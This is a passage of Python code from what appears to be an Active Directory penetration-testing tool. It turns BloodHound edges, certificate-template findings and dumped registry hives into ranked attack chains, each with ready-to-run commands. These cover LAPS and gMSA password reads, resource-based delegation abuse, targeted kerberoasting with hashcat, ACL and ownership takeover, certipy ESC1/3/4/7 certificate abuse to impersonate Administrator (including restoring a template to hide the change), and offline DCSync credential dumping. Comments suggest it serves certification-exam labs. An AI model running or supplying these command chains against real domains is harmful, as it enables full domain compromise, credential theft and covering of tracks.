                    crit=8, conf=0.9, ready=1.5, prox=0.9,          # score 9.72
                    commands=[
                        f"netexec ldap {_dc_e} -u '{_owned}' {_netexec_auth} --gmsa",
                        f"# or: impacket-gMSADumper -u '{_owned}' "
                        f"{_netexec_auth} -d '{_dom_e}' -l {_dc_e}",
                    ], src=edge["src"], line=edge["line"]))
            elif r == "ReadLAPSPassword":
                chains.append(Chain("R-LAPS-READ", "read LAPS password",
                    f"ReadLAPSPassword: {actor} -> {tgt}",
                    crit=8, conf=0.9, ready=1.5, prox=0.9,          # score 9.72
                    commands=[
                        f"netexec ldap {_dc_e} -u '{_owned}' {_netexec_auth} "
                        f"--laps  # filter to {tgt}",
                    ], src=edge["src"], line=edge["line"]))
            elif r == "AddMember":
                chains.append(Chain("R-ADDMEMBER", "AD group add-member",
                    f"AddMember: {actor} -> group {tgt}",
                    crit=6, conf=0.7, ready=1.3, prox=0.8,
                    commands=[
                        f"net rpc group addmem '{tgt}' '{_owned}' "
                        f"{_net_rpc_U} -S {_dc_e}",
                    ], src=edge["src"], line=edge["line"]))
            elif r == "AddAllowedToAct":
                # iter-51: AddAllowedToAct = write msDS-AllowedToAct-
                # OnBehalfOfOtherIdentity (RBCD from the target side).
                # Same primitive as R-RBCD (GenericWrite on computer),
                # different edge name. Route to R-RBCD chain shape.
                host_short = tgt.split(".")[0].rstrip("$")
                fqdn = tgt if "." in tgt else f"{host_short}.{_dom_e}"
                # iter-65: parity with the primary R-RBCD block:
                #   - -dc-ip anchor on getST (KDC discovery on lab boxes
                #     without functional DNS SRV lookups)
                #   - final secretsdump step so the chain reaches its
                #     terminal loot (was missing; chain stopped mid-way).
                # iter-102: same hash-auth threading as primary R-RBCD branch.
                _hf2 = f" {_impacket_hash}" if _impacket_hash else ""
                chains.append(Chain("R-RBCD", "RBCD via AddAllowedToAct",
                    f"AddAllowedToAct: {actor} -> {tgt} "
                    f"(direct RBCD -> S4U2self+U2U)",
                    crit=8, conf=0.75, ready=1.3, prox=0.85,      # score 6.63
                    commands=[
                        f"impacket-addcomputer -computer-name 'attacker$' "
                        f"-computer-pass 'P@ssw0rd!' -dc-host {_dc_e}{_hf2} "
                        f"{_impacket_uri}",
                        f"impacket-rbcd -delegate-from 'attacker$' "
                        f"-delegate-to '{host_short}$' -action write{_hf2} "
                        f"{_impacket_uri}",
                        f"impacket-getST -spn 'cifs/{fqdn}' -dc-ip {_dc_e} "
                        f"-impersonate administrator "
                        f"'{_dom_e}/attacker$:P@ssw0rd!'",
                        f"export KRB5CCNAME=administrator.ccache; "
                        f"impacket-secretsdump -k -no-pass -dc-ip {_dc_e} "
                        f"'{_dom_e}/administrator@{fqdn}'",
                    ], src=edge["src"], line=edge["line"]))
            elif r == "WriteAccountRestrictions":
                # iter-51: WriteAccountRestrictions = write account UAC
                # bits + SPN. Route to targeted-kerberoast (same as
                # WriteSPN since attacker can add an SPN via UAC).
                # iter-102: hash-auth threading as in R-WRITESPN.
                _addspn_auth2 = (f"-hashes '{_blank_lm}:{_owned_hash}'"
                                 if _owned_hash else f"-p '{_owned_pw}'")
                _hf3 = f" {_impacket_hash}" if _impacket_hash else ""
                chains.append(Chain("R-WRITESPN",
                    "targeted kerberoast via WriteAccountRestrictions",
                    f"WriteAccountRestrictions: {actor} -> {tgt} "
                    f"(set SPN + UAC -> kerberoast)",
                    crit=7, conf=0.75, ready=1.3, prox=0.85,       # score 5.80
                    commands=[
                        f"impacket-addspn -u '{_dom_e}\\{_owned}' {_addspn_auth2} "
                        f"-t '{tgt}' -s 'HTTP/kerberoast' {_dc_e}",
                        f"impacket-GetUserSPNs -request-user '{tgt}' -dc-ip {_dc_e} "
                        f"{_impacket_uri}{_hf3} | tee tgs.txt",
                        "hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule",
                    ], src=edge["src"], line=edge["line"]))
            elif r == "AddSelf":
                # iter-51: AddSelf = add own principal to a group. Common
                # tier-2 privilege escalation (add to Enterprise Admins etc.).
                chains.append(Chain("R-ADDSELF", "add-self to group",
                    f"AddSelf: {actor} -> group {tgt}",
                    crit=6, conf=0.75, ready=1.3, prox=0.8,       # score 4.68
                    commands=[
                        f"net rpc group addmem '{tgt}' '{_owned}' "
                        f"{_net_rpc_U} -S {_dc_e}",
                    ], src=edge["src"], line=edge["line"]))
            elif r == "Owns":
                # iter-51: Owns = target's owner. Grant self WriteDacl, then
                # chain to whatever the target enables (usually ForceChange
                # or GenericAll).
                # iter-101: hash-only actor uses _impacket_uri + _impacket_hash.
                _hf = f" {_impacket_hash}" if _impacket_hash else ""
                chains.append(Chain("R-OWNS", "reclaim ownership -> full ACL",
                    f"Owns: {actor} -> {tgt}",
                    crit=7, conf=0.75, ready=1.2, prox=0.85,       # score 5.36
                    commands=[
                        f"# grant self WriteDacl via ownership",
                        f"impacket-owneredit -action write -new-owner "
                        f"'{_owned}' -target '{tgt}'{_hf} "
                        f"{_impacket_uri}",
                        f"impacket-dacledit -action write -rights FullControl "
                        f"-principal '{_owned}' -target '{tgt}'{_hf} "
                        f"{_impacket_uri}",
                        f"# then chain to R-WRITEDACL / R-SHADOW / R-RBCD",
                    ], src=edge["src"], line=edge["line"]))
            elif r == "AllExtendedRights":
                # iter-51: AllExtendedRights = includes User-Force-Change-Pw
                # + Read-GMSA-Pw + Read-LAPS-Pw. Route to ForceChange.
                chains.append(Chain("R-WRITEDACL",
                    "AllExtendedRights -> ForceChangePassword",
                    f"AllExtendedRights: {actor} -> {tgt}",
                    crit=7, conf=0.8, ready=1.4, prox=0.85,       # score 6.66
                    commands=[
                        f"net rpc password '{tgt}' '<NewP@ss123!>' "
                        f"{_net_rpc_U} -S {_dc_e}",
                    ], src=edge["src"], line=edge["line"]))
            elif r == "WriteSPN":
                # iter-41: targeted kerberoast. WriteSPN lets us set an SPN
                # on any user (that itself has no SPN today), then request
                # a TGS for that SPN which encrypts with the target's NT
                # hash - offline crackable. Exam-legal, no relay.
                # iter-101: hash-auth via _netexec_auth / _impacket_uri +
                # _impacket_hash. impacket-addspn accepts -hashes too.
                _addspn_auth = (f"-hashes '{_blank_lm}:{_owned_hash}'"
                                if _owned_hash else f"-p '{_owned_pw}'")
                _hf = f" {_impacket_hash}" if _impacket_hash else ""
                chains.append(Chain("R-WRITESPN", "targeted kerberoast",
                    f"WriteSPN: {actor} -> {tgt} "
                    f"(set fake SPN -> kerberoast -> crack {tgt})",
                    crit=8, conf=0.85, ready=1.4, prox=0.9,       # score 8.57
                    commands=[
                        f"impacket-addspn -u '{_dom_e}\\{_owned}' {_addspn_auth} "
                        f"-t '{tgt}' -s 'HTTP/kerberoast' {_dc_e}",
                        f"impacket-GetUserSPNs -request-user '{tgt}' "
                        f"-dc-ip {_dc_e} {_impacket_uri}{_hf} | tee tgs.txt",
                        "hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule",
                        "# then PtH the recovered NT hash (see R7)",
                    ], src=edge["src"], line=edge["line"]))
    # iter-84: R-ADCS-ESC1 chain. Certipy adapter surfaces ESC1-vulnerable
    # templates as INTERESTING FILES findings + Evidence(kind='cert_template',
    # esc=['ESC1', ...]). If the operator also has ANY plaintext cred, one
    # certipy-ad req yields a PFX for Administrator - fastest DA path when
    # ADCS is misconfigured. Cover ESC1/ESC2/ESC6/ESC9/ESC10/ESC13/ESC15/ESC16
    # (the "give me a cert as Administrator" family; ESC3/ESC4/ESC5/ESC7 are
    # multi-step and ESC8/ESC11 are LAB-ONLY).
    _ESC_REQ_ONE_SHOT = {"ESC1", "ESC2", "ESC6", "ESC9", "ESC10",
                         "ESC13", "ESC15", "ESC16"}
    if e.cert_templates and (e.creds or e.nt):
        # iter-104: prefer plaintext when available; fall back to any known
        # NT hash for the authenticating principal (certipy-ad req accepts
        # -hashes ':NT'). Same pattern as R-CONSTRAINED / R-ADMIN-CRED.
        if e.creds:
            ((_ulc_ac, _pw_ac), _occs_ac) = next(iter(e.creds.items()))
            _disp_ac = _occs_ac[0][0] if _occs_ac[0][0] != "<user>" else _ulc_ac
            _adcs_auth = f"-p '{_pw_ac}'"
        else:
            # pick the first hash whose user is known
            _pick = None
            for _h, _occs in e.nt.items():
                for _hu, _hs, _hl in _occs:
                    if _hu:
                        _pick = (_hu, _h)
                        break
                if _pick:
                    break
            if _pick is None:
                _pick = ("<user>", "<nthash>")
            _disp_ac = _pick[0]
            _ulc_ac = _pick[0].lower()
            _pw_ac = _pick[1]
            _adcs_auth = (f"-hashes 'aad3b435b51404eeaad3b435b51404ee:{_pick[1]}'"
                          if _pick[1] != "<nthash>" else "-p '<password>'")
        _dom_esc = store.dominant_domain() or "<dom>"
        _dc_esc = store.dc_ip() or "<DC-IP>"
        _emitted_tpls = set()
        for tpl in e.cert_templates:
            if tpl["lab_only"]:
                continue
            _fires = [esc for esc in tpl["esc"] if esc in _ESC_REQ_ONE_SHOT]
            if not _fires:
                continue
            _tkey = (tpl["template"], tpl["ca"])
            if _tkey in _emitted_tpls:
                continue
            _emitted_tpls.add(_tkey)
            _esc_tag = ",".join(_fires)
            # iter-88: fall back to '<CA>' placeholder when BH-CE data has
            # no CA link (only certipy find carries the CA context reliably).
            _ca_tag = tpl["ca"] or "<CA>"
            chains.append(Chain("R-ADCS-ESC1", "ADCS ESC1 -> Administrator PFX",
                f"{_esc_tag} template '{tpl['template']}' -> req cert as Administrator",
                crit=9, conf=0.9, ready=1.4, prox=0.95,      # score 10.77
                commands=[
                    f"certipy-ad req -u '{_disp_ac}@{_dom_esc}' {_adcs_auth} "
                    f"-ca '{_ca_tag}' -template '{tpl['template']}' "
                    f"-upn 'administrator@{_dom_esc}' -dc-ip {_dc_esc}",
                    f"certipy-ad auth -pfx administrator.pfx -dc-ip {_dc_esc}",
                    f"# certipy prints the NT hash + TGT; PtH via R7 to any host",
                ], src=tpl["src"], line=tpl["line"]))
        # iter-118: R-ADCS-ESC4 - vulnerable template ACL. Certipy has a
        # native 'template' subcommand that rewrites the template to be
        # ESC1-shaped (client-auth EKU + enrollee-supplies-subject) and
        # saves the original for restore. Not covered by R-ADCS-ESC1 because
        # it needs the pre-step; but it's still exam-legal (manual, targeted).
        _emitted_esc4 = set()
        for tpl in e.cert_templates:
            if tpl["lab_only"]:
                continue
            if "ESC4" not in tpl["esc"]:
                continue
            _tkey4 = (tpl["template"], tpl["ca"])
            if _tkey4 in _emitted_esc4:
                continue
            _emitted_esc4.add(_tkey4)
            _ca4 = tpl["ca"] or "<CA>"
            _tpl_name = tpl["template"]
            chains.append(Chain("R-ADCS-ESC4", "ADCS ESC4 -> rewrite template -> ESC1",
                f"ESC4 template '{_tpl_name}' - operator can WriteDacl/WriteOwner it",
                crit=9, conf=0.85, ready=1.3, prox=0.9,      # score 8.95
                commands=[
                    f"# 1. save original template config, then rewrite to ESC1-shape:",
                    f"certipy-ad template -u '{_disp_ac}@{_dom_esc}' {_adcs_auth} "
                    f"-template '{_tpl_name}' -save-old -dc-ip {_dc_esc}",
                    f"# 2. enroll for Administrator via the now-vuln template:",
                    f"certipy-ad req -u '{_disp_ac}@{_dom_esc}' {_adcs_auth} "
                    f"-ca '{_ca4}' -template '{_tpl_name}' "
                    f"-upn 'administrator@{_dom_esc}' -dc-ip {_dc_esc}",
                    f"certipy-ad auth -pfx administrator.pfx -dc-ip {_dc_esc}",
                    f"# 3. restore the original config to hide the change:",
                    f"certipy-ad template -u '{_disp_ac}@{_dom_esc}' {_adcs_auth} "
                    f"-template '{_tpl_name}' "
                    f"-configuration '{_tpl_name}.json' -dc-ip {_dc_esc}",
                ], src=tpl["src"], line=tpl["line"]))
        # iter-119: R-ADCS-ESC7 - CA management ACL (ManageCA/ManageCertificates)
        # grants the operator officer-level control over the CA itself. Canonical
        # exploit re-enables the disabled-by-default SubCA template (which is
        # ESC1-vulnerable by design), requests a cert against it (CA denies but
        # returns a request-id), then the operator issues the request as CA
        # officer and retrieves the pfx. Emit as a distinct chain because the
        # command sequence is 4 steps, not 1.
        _emitted_esc7 = set()
        for tpl in e.cert_templates:
            if tpl["lab_only"]:
                continue
            if "ESC7" not in tpl["esc"]:
                continue
            _ca7 = tpl["ca"] or "<CA>"
            if _ca7 in _emitted_esc7:
                continue
            _emitted_esc7.add(_ca7)
            chains.append(Chain("R-ADCS-ESC7", "ADCS ESC7 -> CA officer -> SubCA cert",
                f"ESC7 CA '{_ca7}' - operator has ManageCA/ManageCertificates",
                crit=9, conf=0.85, ready=1.2, prox=0.9,      # score 8.26
                commands=[
                    f"# 1. add self as CA officer (ManageCA right):",
                    f"certipy-ad ca -u '{_disp_ac}@{_dom_esc}' {_adcs_auth} "
                    f"-ca '{_ca7}' -add-officer '{_disp_ac}' -dc-ip {_dc_esc}",
                    f"# 2. enable the disabled-by-default SubCA template:",
                    f"certipy-ad ca -u '{_disp_ac}@{_dom_esc}' {_adcs_auth} "
                    f"-ca '{_ca7}' -enable-template SubCA -dc-ip {_dc_esc}",
                    f"# 3. request cert against SubCA (CA denies, prints "
                    f"request-id in output):",
                    f"certipy-ad req -u '{_disp_ac}@{_dom_esc}' {_adcs_auth} "
                    f"-ca '{_ca7}' -template SubCA "
                    f"-upn 'administrator@{_dom_esc}' -dc-ip {_dc_esc}",
                    f"# 4. approve the denied request as CA officer, then "
                    f"retrieve:",
                    f"certipy-ad ca -u '{_disp_ac}@{_dom_esc}' {_adcs_auth} "
                    f"-ca '{_ca7}' -issue-request <request-id> -dc-ip {_dc_esc}",
                    f"certipy-ad req -u '{_disp_ac}@{_dom_esc}' {_adcs_auth} "
                    f"-ca '{_ca7}' -retrieve <request-id> -dc-ip {_dc_esc}",
                    f"certipy-ad auth -pfx administrator.pfx -dc-ip {_dc_esc}",
                ], src=tpl["src"], line=tpl["line"]))
        # iter-120: R-ADCS-ESC3 - Enrollment Agent template. The vulnerable
        # template carries the Certificate Request Agent EKU which lets the
        # operator enroll for a cert then use that cert to enroll ON BEHALF OF
        # another principal against the User template. Two-step certipy req
        # chain; exam-legal (no relay, all manual).
        _emitted_esc3 = set()
        for tpl in e.cert_templates:
            if tpl["lab_only"]:
                continue
            if "ESC3" not in tpl["esc"]:
                continue
            _tkey3 = (tpl["template"], tpl["ca"])
            if _tkey3 in _emitted_esc3:
                continue
            _emitted_esc3.add(_tkey3)
            _ca3 = tpl["ca"] or "<CA>"
            _tpl3 = tpl["template"] or "<ea-template>"
            chains.append(Chain("R-ADCS-ESC3", "ADCS ESC3 -> EA cert -> on-behalf-of admin",
                f"ESC3 template '{_tpl3}' - Enrollment Agent EKU allows on-behalf-of enrollment",
                crit=9, conf=0.85, ready=1.35, prox=0.9,     # score 9.29
                commands=[
                    f"# 1. enroll for the EA cert against the vulnerable template:",
                    f"certipy-ad req -u '{_disp_ac}@{_dom_esc}' {_adcs_auth} "
                    f"-ca '{_ca3}' -template '{_tpl3}' -pfx ea.pfx -dc-ip {_dc_esc}",
                    f"# 2. use the EA cert to enroll for Administrator via User "
                    f"template:",
                    f"certipy-ad req -u '{_disp_ac}@{_dom_esc}' {_adcs_auth} "
                    f"-ca '{_ca3}' -template User "
                    f"-on-behalf-of '{_dom_esc}\\administrator' "
                    f"-pfx ea.pfx -dc-ip {_dc_esc}",
                    f"certipy-ad auth -pfx administrator.pfx -dc-ip {_dc_esc}",
                ], src=tpl["src"], line=tpl["line"]))

    # SAM/SYSTEM/SECURITY triad in one dir -> local secretsdump (no network).
    # iter-13: conf=1.0 was 'command will succeed', but conf encodes 'likelihood
    # of access'. SAM gives LOCAL hashes only - useful where the originating
    # host is reachable; useless against the DC without --local-auth.
    # iter-74: emit real paths (os.path.join(d, hive_name)) instead of the
    # bare 'SAM'/'SYSTEM'/'NTDS.dit' filenames the previous version used -
    # the operator can now paste from wherever their CWD is instead of
    # having to cd into the loot dir first.
    for d, hives in e.sam_dirs.items():
        _sam = os.path.join(d, "SAM")
        _sys = os.path.join(d, "SYSTEM")
        _sec = os.path.join(d, "SECURITY")
        _ntds = os.path.join(d, "NTDS.dit")
        if {"sam", "system"} <= hives:
            chains.append(Chain("R3T", "dump SAM", "SAM+SYSTEM -> local NT hashes (PtH against ORIGINATING host with --local-auth, NOT the DC)",
                crit=7, conf=0.9, ready=1.5, prox=0.7,        # score 6.62
                commands=[f"impacket-secretsdump -sam '{_sam}' -system '{_sys}'" +
                          (f" -security '{_sec}'" if "security" in hives else "") + " LOCAL"],
                src=_sam))
        # iter-21: NTDS.dit + SYSTEM = offline DCSync (R3D).
        # Highest-yield AD chain - dumps EVERY domain account NTLM hash
        # without touching the network, fully exam-legal.
        if {"ntds", "system"} <= hives:
            chains.append(Chain("R3D", "offline DCSync",
                "NTDS.dit + SYSTEM hive -> offline DCSync (ALL domain creds, no network)",
                crit=10, conf=0.95, ready=1.5, prox=0.9,      # score 12.83 - tops the queue
                commands=[f"impacket-secretsdump -ntds '{_ntds}' -system '{_sys}' LOCAL"],
                src=_ntds))

    # ── dedup identical chains across files (keep best score, sum counts) ──
    by_key = {}
    for c in chains:
        k = (c.rule, c.summary)
        if k in by_key:
            by_key[k].count += c.count
        else:
            by_key[k] = c
    chains = list(by_key.values())

    # ── compliance gate: tag lab-only, drop anything non-compliant ──
    clean = []
    for c in chains:
        cmds = []
        ok = True
        for cmd in c.commands:
            if c.lab_only and LAB not in cmd:
                cmd = cmd + "  " + LAB
            legal, _ = compliance.lint_command(cmd, tagged=c.lab_only)
            if not legal:
                ok = False
                break
            cmds.append(cmd)
        if ok and cmds:
            c.commands = cmds
            clean.append(c)
    chains = clean

    # iter-15: stable tiebreakers so identical-score chains never reorder
    # across runs. Order: score desc, ready desc, prox-known first, more
    # commands first, then rule_id + src + line + summary alphabetic.
    chains.sort(key=lambda c: (
        -c.score, -c.ready, c.prox is None, -len(c.commands),
        c.rule or "", c.src or "", c.line or 0, c.summary or ""))

    for c in chains:
        sev = "CRITICAL" if c.score >= 6 else "HIGH" if c.score >= 2 else "MEDIUM"
        if c.lab_only:
            sev = "MEDIUM"
        report.add(sev, "ATTACK CHAINS", c.src, c.line,
                   f"[{c.rule}] {c.summary}  (score {c.score})",
                   "  ;  ".join(c.commands))
    return chains


def _prox(store, host):
    """proximity 0.3-1.0: DC endpoints score highest."""
    if not host or host.startswith("<"):
        return 0.5
    for x in store.by_kind("host"):
        if x.host == host and x.fact == "dc":
            return 1.0
    return 0.7
